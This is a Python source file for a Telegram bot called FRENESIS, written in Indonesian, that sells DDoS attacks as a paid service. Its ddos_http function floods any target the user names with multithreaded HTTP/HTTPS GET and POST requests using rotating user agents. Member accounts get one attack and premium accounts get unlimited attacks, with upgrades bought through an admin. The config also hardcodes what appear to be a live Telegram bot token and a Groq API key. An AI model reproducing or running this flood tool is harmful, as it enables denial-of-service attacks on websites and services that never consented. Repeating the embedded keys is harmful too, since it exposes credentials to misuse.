#!/usr/bin/env python3
"""
FRENESIS - Telegram Bot with DDoS, AI, Role System
Coded by ©azradev
"""

import os, sys, json, hashlib, threading, time, random, string, subprocess, datetime, base64
from datetime import timedelta
from typing import Optional, Dict, Any

# ----------------------------- Auto-install modules -----------------------------
def install(package):
    try:
        __import__(package)
    except ImportError:
        print(f"[*] Installing {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

for mod in ["telebot", "requests"]:
    install(mod)

import telebot
from telebot import types
import requests

# ----------------------------- Config & Database -----------------------------
CONFIG_FILE = "config.json"
ACCOUNTS_FILE = "accounts.json"
LOGO_FILE = "logo.jpg"
ADMIN_CONTACT = "@azra"

def load_json(file, default={}):
    if not os.path.exists(file):
        with open(file, "w") as f:
            json.dump(default, f, indent=2)
        return default
    with open(file) as f:
        return json.load(f)

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=2)

config = load_json(CONFIG_FILE, {
    "bot_token": "8530059653:AAGbdrmnedNbOc5PRUDgrM2AU6finnAeeV0",
    "api_key_groq": "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",
    "model_groq": "gpt-oss-120b",
    "ddos_price": 10000,
    "admin_id": 7959551372,
    "first_run": True
})
accounts = load_json(ACCOUNTS_FILE, {})

TOKEN = config.get("bot_token") or os.environ.get("BOT_TOKEN")
if not TOKEN:
    TOKEN = input("Masukkan Bot Token: ").strip()
    config["bot_token"] = TOKEN
    save_json(CONFIG_FILE, config)

# ----------------------------- Bot Instance -----------------------------
bot = telebot.TeleBot(TOKEN, threaded=True)
sessions: Dict[int, str] = {}               # chat_id -> username
active_attacks: Dict[int, bool] = {}         # chat_id -> attack running
attack_stop_events: Dict[int, threading.Event] = {}
attack_threads: Dict[int, threading.Thread] = {}
user_locks = threading.Lock()

# ----------------------------- Utility Functions -----------------------------
def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()

def is_admin(user_id: int) -> bool:
    return user_id == config.get("admin_id", 0)

def get_user(username: str) -> Optional[dict]:
    return accounts.get(username)

def is_banned(user: dict) -> bool:
    if user.get("banned_permanent", False):
        return True
    until = user.get("banned_until")
    if until:
        try:
            until_dt = datetime.datetime.fromisoformat(until)
            if datetime.datetime.now() < until_dt:
                return True
        except:
            pass
    return False

def is_premium_active(user: dict) -> bool:
    if user.get("role") != "premium":
        return False
    expiry = user.get("premium_expiry")
    if expiry is None:
        return True  # permanen
    try:
        expiry_dt = datetime.datetime.fromisoformat(expiry)
        return datetime.datetime.now() < expiry_dt
    except:
        return False

def check_auth(func):
    """Decorator to ensure user is logged in and not banned"""
    def wrapper(message):
        chat_id = message.chat.id
        if chat_id not in sessions:
            bot.send_message(chat_id, "❌ Anda belum login. Gunakan /login <username> <password>")
            return
        username = sessions[chat_id]
        user = get_user(username)
        if not user:
            bot.send_message(chat_id, "❌ Akun tidak ditemukan.")
            return
        if is_banned(user):
            bot.send_message(chat_id, "🚫 Akun Anda telah dibanned.")
            return
        # Jika role premium tapi sudah expired, downgrade
        if user.get("role") == "premium" and not is_premium_active(user):
            with user_locks:
                user["role"] = "member"
                user["premium_expiry"] = None
                save_json(ACCOUNTS_FILE, accounts)
            bot.send_message(chat_id, "⏳ Masa premium Anda telah berakhir. Role kembali ke Member.")
        func(message, user)
    return wrapper

# ----------------------------- Logo & Menu -----------------------------
def generate_logo():
    """ASCII logo if image not found"""
    logo = """
▗▄▄▄▖▗▄▄▖  ▗▄▄▄▖▗▖  ▗▖▗▄▄▄▖▗▄▄▄▖▗▄▄▄▖▗▄▄▄▖
  █  █   █ █     ▝▚▞▘ █     █  █     █
  █  █   █ █▄▄▄▄  ▐▛▜▌ █▄▄▄▖ █  █▄▄▄▖ ▀▀▀▀▀
  █  █   █ █     ▗▘▝▚▖     █ █  █         █
  █  █   █ █     █   █ █   █ █  █     ▗▄▄▄▖
  █  █   █ █    ▗▞    █ █  █   █     █   █
  █  █   █ █   ▗▘     █ █ █   █     █   █
  ▀▀ ▀▀▀▀▀ ▀▀▀▀▀▀      ▀▀ ▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀
"""
    return logo.strip()

def get_main_menu_markup(user_logged_in=False, is_prem=False):
    markup = types.InlineKeyboardMarkup(row_width=2)
    if not user_logged_in:
        markup.add(
            types.InlineKeyboardButton("🔐 Login", callback_data="menu_login"),
            types.InlineKeyboardButton("📝 Daftar", callback_data="menu_register")
        )
        markup.add(
            types.InlineKeyboardButton("💎 Beli Premium", callback_data="menu_buy"),
            types.InlineKeyboardButton("ℹ️ Bantuan", callback_data="menu_help")
        )
    else:
        markup.add(
            types.InlineKeyboardButton("⚔️ Serang DDoS", callback_data="menu_attack"),
            types.InlineKeyboardButton("🤖 AI Chat", callback_data="menu_ai")
        )
        markup.add(
            types.InlineKeyboardButton("👤 Profil", callback_data="menu_profile"),
            types.InlineKeyboardButton("🛑 Stop Attack", callback_data="menu_stopattack")
        )
        if is_prem:
            markup.add(types.InlineKeyboardButton("💎 Premium Aktif", callback_data="dummy"))
        else:
            markup.add(types.InlineKeyboardButton("💎 Upgrade Premium", callback_data="menu_buy"))
        markup.add(types.InlineKeyboardButton("📖 Aturan", callback_data="menu_rules"))
    return markup

def send_logo_and_menu(chat_id, user_logged_in=False, is_prem=False):
    caption = (
        "🔥 *FRENESIS* 🔥\n"
        "Bot DDoS + AI by ©azradev\n"
        "_" + "="*30 + "_\n"
        "📌 *MENU UTAMA*\n"
        "Silakan pilih menu di bawah ini:"
    )
    if not user_logged_in:
        caption += (
            "\n\n⚠️ *ATURAN BAGI PENGGUNA BARU:*\n"
            "1. Daftar akun dulu dengan /register <username> <password>\n"
            "2. Setelah punya akun, login dengan /login <username> <password>\n"
            "3. Role *Member* hanya bisa 1x DDoS & 50 pertanyaan AI\n"
            "4. Upgrade ke *Premium* Rp10.000 (bisa diubah admin) hubungi " + ADMIN_CONTACT + "\n"
            "5. Premium bisa DDoS unlimited (jeda 2 menit) & AI tanpa batas\n"
            "6. Admin dapat membuat, menghapus, banned akun, dan upgrade akun\n"
            "7. Semua transaksi manual via admin " + ADMIN_CONTACT
        )
    if os.path.exists(LOGO_FILE):
        with open(LOGO_FILE, "rb") as img:
            bot.send_photo(chat_id, img, caption=caption, parse_mode="Markdown",
                           reply_markup=get_main_menu_markup(user_logged_in, is_prem))
    else:
        logo_ascii = generate_logo()
        full_text = f"```{logo_ascii}```\n\n{caption}"
        bot.send_message(chat_id, full_text, parse_mode="Markdown",
                         reply_markup=get_main_menu_markup(user_logged_in, is_prem))

# ----------------------------- DDoS Engine -----------------------------
def ddos_http(target: str, port: int = 80, use_https: bool = False, stop_event: threading.Event = None,
              duration: int = 60, threads: int = 50):
    protocol = "https" if use_https else "http"
    url = f"{protocol}://{target}:{port}/"
    # Headers acak
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    ]
    def flood():
        while not stop_event.is_set():
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "*/*",
                    "Cache-Control": "no-cache",
                    "Connection": "keep-alive"
                }
                # Mix GET and POST
                if random.random() > 0.5:
                    requests.get(url, headers=headers, timeout=2)
                else:
                    requests.post(url, data={"rand": os.urandom(8).hex()}, headers=headers, timeout=2)
            except:
                pass
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
    # Tunggu sampai stop_event atau timeout
    stop_event.wait(timeout=duration)

def start_attack(chat_id, user, target, port=80, method="http"):
    with user_locks:
        if chat_id in active_attacks and active_attacks[chat_id]:
            bot.send_message(chat_id, "❌ Serangan masih berlangsung. Gunakan /stopattack dulu.")
            return
        # Cek kelayakan
        role = user.get("role")
        if role == "member":
            remaining = user.get("ddos_remaining", 1)
            if remaining <= 0:
                bot.send_message(chat_id, "❌ Anda sudah menggunakan jatah DDoS (Member hanya 1x). Upgrade ke Premium.")
                return
        else:  # premium
            # Cek jeda 2 menit
            last = user.get("last_attack_time")
            if last:
                last_dt = datetime.datetime.fromisoformat(last)
                if datetime.datetime.now() < last_dt + timedelta(minutes=2):
                    sisa = (last_dt + timedelta(minutes=2) - datetime.datetime.now()).seconds
                    bot.send_message(chat_id, f"⏳ Tunggu {sisa} detik lagi sebelum serangan berikutnya (Premium jeda 2 menit).")
                    return
        # Tentukan parameter serangan
        use_https = method.lower() == "https"
        duration = 60  # default 60 detik, bisa diubah sesuai role? member lebih pendek? biarkan sama.
        threads = 50   # bisa ditingkatkan untuk premium
        if role == "premium":
            duration = 120  # premium lebih lama? opsional
            threads = 100
        # Set status attack
        active_attacks[chat_id] = True
        stop_event = threading.Event()
        attack_stop_events[chat_id] = stop_event
        # Kurangi jatah jika member
        if role == "member":
            user["ddos_remaining"] = user.get("ddos_remaining", 1) - 1
        # Catat waktu attack
        user["last_attack_time"] = datetime.datetime.now().isoformat()
        save_json(ACCOUNTS_FILE, accounts)
    # Jalankan di thread terpisah
    def attack_thread():
        bot.send_message(chat_id, f"🔥 Memulai serangan DDoS {method.upper()} ke {target}:{port} selama {duration} detik...")
        ddos_http(target, port, use_https, stop_event, duration, threads)
        with user_locks:
            active_attacks[chat_id] = False
            attack_stop_events.pop(chat_id, None)
            attack_threads.pop(chat_id, None)
        bot.send_message(chat_id, "✅ Serangan selesai.")
        # Kirim ulang menu
        user = get_user(sessions.get(chat_id))
        if user:
            send_logo_and_menu(chat_id, True, is_premium_active(user))

    t = threading.Thread(target=attack_thread)
    t.daemon = True
    attack_threads[chat_id] = t
    t.start()

def stop_attack(chat_id):
    with user_locks:
        if chat_id in attack_stop_events:
            attack_stop_events[chat_id].set()
            bot.send_message(chat_id, "🛑 Menghentikan serangan...")
        else:
            bot.send_message(chat_id, "❌ Tidak ada serangan berjalan.")

# ----------------------------- AI Groq -----------------------------
def ask_groq(prompt: str, chat_id: int) -> str:
    api_key = config.get("api_key_groq", "")
    if not api_key:
        return "Mohon maaf AI sedang offline"
    model = config.get("model_groq", "llama3-8b-8192")
    url = "https://api.groq.com/openai/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    payload = {
        "model": model,
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.7
    }
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=15)
        if r.status_code == 200:
            return r.json()["choices"][0]["message"]["content"]
        else:
            return f"❌ Error: {r.status_code}"
    except Exception as e:
        return f"❌ Exception: {str(e)}"

# ----------------------------- Bot Command Handlers -----------------------------
@bot.message_handler(commands=['start'])
def cmd_start(message):
    chat_id = message.chat.id
    logged_in = chat_id in sessions and get_user(sessions[chat_id]) is not None
    is_prem = False
    if logged_in:
        user = get_user(sessions[chat_id])
        is_prem = is_premium_active(user)
    send_logo_and_menu(chat_id, logged_in, is_prem)

@bot.message_handler(commands=['register'])
def cmd_register(message):
    chat_id = message.chat.id
    if chat_id in sessions:
        bot.send_message(chat_id, "❌ Anda sudah login. Logout dulu? (tidak ada fitur logout, abaikan)")
        return
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.send_message(chat_id, "📝 Gunakan: /register <username> <password>")
            return
        username = parts[1].lower()
        password = parts[2]
        if len(password) < 4:
            bot.send_message(chat_id, "❌ Password minimal 4 karakter.")
            return
        with user_locks:
            if username in accounts:
                bot.send_message(chat_id, "❌ Username sudah terdaftar.")
                return
            accounts[username] = {
                "password_hash": hash_password(password),
                "role": "member",
                "ddos_remaining": 1,
                "ai_count": 0,
                "last_attack_time": None,
                "banned_until": None,
                "banned_permanent": False,
                "premium_expiry": None
            }
            save_json(ACCOUNTS_FILE, accounts)
        bot.send_message(chat_id, f"✅ Akun @{username} berhasil dibuat. Silakan login dengan /login {username} {password}")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {e}")

@bot.message_handler(commands=['login'])
def cmd_login(message):
    chat_id = message.chat.id
    if chat_id in sessions:
        bot.send_message(chat_id, "❌ Anda sudah login.")
        return
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.send_message(chat_id, "🔐 Gunakan: /login <username> <password>")
            return
        username = parts[1].lower()
        password = parts[2]
        user = get_user(username)
        if not user or user["password_hash"] != hash_password(password):
            bot.send_message(chat_id, "❌ Username atau password salah.")
            return
        if is_banned(user):
            bot.send_message(chat_id, "🚫 Akun Anda sedang dibanned.")
            return
        with user_locks:
            sessions[chat_id] = username
        bot.send_message(chat_id, f"✅ Login berhasil, selamat datang @{username}!")
        send_logo_and_menu(chat_id, True, is_premium_active(user))
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {e}")

@bot.message_handler(commands=['attack'])
@check_auth
def cmd_attack(message, user):
    chat_id = message.chat.id
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(chat_id, "⚔️ Gunakan: /attack <target> [port] [http/https]\nContoh: /attack example.com 80 http")
        return
    target = parts[1]
    port = 80
    method = "http"
    if len(parts) >= 3:
        try:
            port = int(parts[2])
        except ValueError:
            method = parts[2]  # mungkin method jika bukan angka
    if len(parts) >= 4:
        method = parts[3]
    if method not in ["http", "https"]:
        method = "http"
    start_attack(chat_id, user, target, port, method)

@bot.message_handler(commands=['stopattack'])
def cmd_stopattack(message):
    chat_id = message.chat.id
    stop_attack(chat_id)

@bot.message_handler(commands=['ai'])
@check_auth
def cmd_ai(message, user):
    chat_id = message.chat.id
    # Cek limit AI untuk member
    if user.get("role") == "member":
        if user.get("ai_count", 0) >= 50:
            bot.send_message(chat_id, "❌ Limit AI Anda telah mencapai 50. Upgrade ke Premium untuk akses unlimited.")
            return
    # Cek api key
    if not config.get("api_key_groq"):
        bot.send_message(chat_id, "Mohon maaf AI sedang offline")
        return
    prompt = message.text.replace("/ai", "").strip()
    if not prompt:
        bot.send_message(chat_id, "🤖 Gunakan: /ai <pertanyaan>")
        return
    bot.send_chat_action(chat_id, "typing")
    answer = ask_groq(prompt, chat_id)
    # Increment counter
    with user_locks:
        user["ai_count"] = user.get("ai_count", 0) + 1
        save_json(ACCOUNTS_FILE, accounts)
    bot.send_message(chat_id, f"🤖 *FRENESIS AI:*\n{answer}", parse_mode="Markdown")

# ----------------------------- Admin Commands -----------------------------
def admin_only(func):
    def wrapper(message):
        if not is_admin(message.chat.id):
            bot.send_message(message.chat.id, "⛔ Hanya admin yang dapat menggunakan perintah ini.")
            return
        func(message)
    return wrapper

@bot.message_handler(commands=['createuser'])
@admin_only
def cmd_createuser(message):
    try:
        parts = message.text.split()
        if len(parts) < 4:
            bot.send_message(message.chat.id, "Gunakan: /createuser <username> <password> [role:member/premium] [premium_days]")
            return
        username = parts[1].lower()
        password = parts[2]
        role = "member"
        premium_days = 0
        if len(parts) >= 4:
            role = parts[3] if parts[3] in ("member", "premium") else "member"
        if len(parts) >= 5:
            try:
                premium_days = int(parts[4])
            except:
                pass
        with user_locks:
            if username in accounts:
                bot.send_message(message.chat.id, "Username sudah ada.")
                return
            expiry = None
            if role == "premium":
                if premium_days > 0:
                    expiry = (datetime.datetime.now() + timedelta(days=premium_days)).isoformat()
                else:
                    expiry = None  # permanen
            accounts[username] = {
                "password_hash": hash_password(password),
                "role": role,
                "ddos_remaining": -1 if role == "premium" else 1,
                "ai_count": 0,
                "last_attack_time": None,
                "banned_until": None,
                "banned_permanent": False,
                "premium_expiry": expiry
            }
            save_json(ACCOUNTS_FILE, accounts)
        bot.send_message(message.chat.id, f"✅ Akun @{username} dibuat dengan role {role}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['deleteuser'])
@admin_only
def cmd_deleteuser(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Gunakan: /deleteuser <username>")
            return
        username = parts[1].lower()
        with user_locks:
            if username in accounts:
                del accounts[username]
                save_json(ACCOUNTS_FILE, accounts)
                bot.send_message(message.chat.id, f"❌ Akun @{username} dihapus.")
            else:
                bot.send_message(message.chat.id, "Username tidak ditemukan.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['banuser'])
@admin_only
def cmd_banuser(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Gunakan: /banuser <username> [menit] (0 atau kosong untuk permanen)")
            return
        username = parts[1].lower()
        duration = 0
        if len(parts) >= 3:
            try:
                duration = int(parts[2])
            except:
                pass
        with user_locks:
            user = accounts.get(username)
            if not user:
                bot.send_message(message.chat.id, "Username tidak ditemukan.")
                return
            if duration > 0:
                user["banned_until"] = (datetime.datetime.now() + timedelta(minutes=duration)).isoformat()
                user["banned_permanent"] = False
            else:
                user["banned_permanent"] = True
                user["banned_until"] = None
            # Logout user yang sedang login
            for chat_id, uname in list(sessions.items()):
                if uname == username:
                    del sessions[chat_id]
            save_json(ACCOUNTS_FILE, accounts)
        bot.send_message(message.chat.id, f"🚫 @{username} telah dibanned {'permanen' if duration==0 else f'selama {duration} menit'}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['unbanuser'])
@admin_only
def cmd_unbanuser(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Gunakan: /unbanuser <username>")
            return
        username = parts[1].lower()
        with user_locks:
            user = accounts.get(username)
            if not user:
                bot.send_message(message.chat.id, "Username tidak ditemukan.")
                return
            user["banned_until"] = None
            user["banned_permanent"] = False
            save_json(ACCOUNTS_FILE, accounts)
        bot.send_message(message.chat.id, f"✅ @{username} telah di-unban.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['upgradeuser'])
@admin_only
def cmd_upgradeuser(message):
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.send_message(message.chat.id, "Gunakan: /upgradeuser <username> <hari> (0 untuk permanen)")
            return
        username = parts[1].lower()
        days = int(parts[2])
        with user_locks:
            user = accounts.get(username)
            if not user:
                bot.send_message(message.chat.id, "Username tidak ditemukan.")
                return
            user["role"] = "premium"
            if days == 0:
                user["premium_expiry"] = None
            else:
                user["premium_expiry"] = (datetime.datetime.now() + timedelta(days=days)).isoformat()
            user["ddos_remaining"] = -1  # unlimited
            save_json(ACCOUNTS_FILE, accounts)
        bot.send_message(message.chat.id, f"⭐ @{username} diupgrade ke Premium {'permanen' if days==0 else f'selama {days} hari'}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['setprice'])
@admin_only
def cmd_setprice(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Gunakan: /setprice <harga>")
            return
        new_price = int(parts[1])
        config["ddos_price"] = new_price
        save_json(CONFIG_FILE, config)
        bot.send_message(message.chat.id, f"💰 Harga upgrade Premium diubah menjadi Rp{new_price}.")
    except:
        bot.send_message(message.chat.id, "Format salah. Gunakan: /setprice 10000")

@bot.message_handler(commands=['setapikey'])
@admin_only
def cmd_setapikey(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Gunakan: /setapikey <api_key_groq>")
            return
        config["api_key_groq"] = parts[1].strip()
        save_json(CONFIG_FILE, config)
        bot.send_message(message.chat.id, "🔑 API Key Groq disimpan.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['setmodel'])
@admin_only
def cmd_setmodel(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Gunakan: /setmodel <model_groq>")
            return
        config["model_groq"] = parts[1].strip()
        save_json(CONFIG_FILE, config)
        bot.send_message(message.chat.id, f"🤖 Model AI diubah ke {parts[1]}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['setadmin'])
def cmd_setadmin(message):
    """Set admin ID for first time (only if admin_id is 0)"""
    if config.get("admin_id", 0) == 0:
        try:
            config["admin_id"] = message.chat.id
            save_json(CONFIG_FILE, config)
            bot.send_message(message.chat.id, "👑 Anda sekarang adalah admin.")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        bot.send_message(message.chat.id, "❌ Admin sudah diatur.")

# ----------------------------- Callback Handlers -----------------------------
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data

    if data == "menu_login":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "🔐 Gunakan: /login <username> <password>")
    elif data == "menu_register":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "📝 Gunakan: /register <username> <password>")
    elif data == "menu_buy":
        bot.answer_callback_query(call.id)
        price = config.get("ddos_price", 10000)
        bot.send_message(chat_id, f"💎 Untuk upgrade Premium seharga Rp{price}, hubungi admin: {ADMIN_CONTACT}\n"
                                  "Berikan username Anda (tanpa password) kepada admin.")
    elif data == "menu_help":
        bot.answer_callback_query(call.id)
        help_text = (
            "📖 *Bantuan FRENESIS*\n"
            "Perintah:\n"
            "/start - Menu utama\n"
            "/register <user> <pass> - Daftar akun\n"
            "/login <user> <pass> - Login\n"
            "/attack <target> [port] [method] - DDoS\n"
            "/stopattack - Hentikan serangan\n"
            "/ai <pertanyaan> - Tanya AI\n"
            "/profil - Lihat profil (coming soon)\n"
            "Admin: /createuser, /deleteuser, /banuser, /unbanuser, /upgradeuser, /setprice, /setapikey, /setmodel, /setadmin"
        )
        bot.send_message(chat_id, help_text, parse_mode="Markdown")
    elif data == "menu_attack":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "⚔️ Ketik /attack <target> <port> <http/https>")
    elif data == "menu_ai":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "🤖 Ketik /ai <pertanyaan>")
    elif data == "menu_profile":
        bot.answer_callback_query(call.id)
        username = sessions.get(chat_id)
        if username:
            user = get_user(username)
            if user:
                prem = "Ya" if is_premium_active(user) else "Tidak"
                banned = "Ya" if is_banned(user) else "Tidak"
                ai_used = user.get("ai_count", 0)
                profile = (
                    f"👤 *Profil @{username}*\n"
                    f"Role: {user['role']}\n"
                    f"Premium: {prem}\n"
                    f"AI digunakan: {ai_used}/50 (Member)\n"
                    f"DDoS tersisa: {'Unlimited' if user.get('ddos_remaining', -1) == -1 else user.get('ddos_remaining', 0)}\n"
                    f"Banned: {banned}"
                )
                bot.send_message(chat_id, profile, parse_mode="Markdown")
            else:
                bot.send_message(chat_id, "Akun tidak ditemukan.")
        else:
            bot.send_message(chat_id, "Anda belum login.")
    elif data == "menu_stopattack":
        bot.answer_callback_query(call.id)
        stop_attack(chat_id)
    elif data == "menu_rules":
        bot.answer_callback_query(call.id)
        rules = (
            "📌 *ATURAN*\n"
            "1. Daftar akun dulu dengan /register\n"
            "2. Login dengan /login\n"
            "3. Member hanya 1x DDoS & 50 AI\n"
            "4. Premium unlimited DDoS (jeda 2 menit) & AI tanpa batas\n"
            "5. Upgrade Premium hubungi admin " + ADMIN_CONTACT + "\n"
            "6. Admin dapat membuat, menghapus, banned akun\n"
            "7. Transaksi manual"
        )
        bot.send_message(chat_id, rules, parse_mode="Markdown")
    else:
        bot.answer_callback_query(call.id)

# ----------------------------- Run Bot -----------------------------
if __name__ == "__main__":
    print("FRENESIS Bot Running...")
    # Auto-set admin if not set and first run
    if config.get("admin_id", 0) == 0:
        print("[!] Admin belum diatur. Kirim /setadmin dari chat yang ingin menjadi admin.")
    bot.infinity_polling()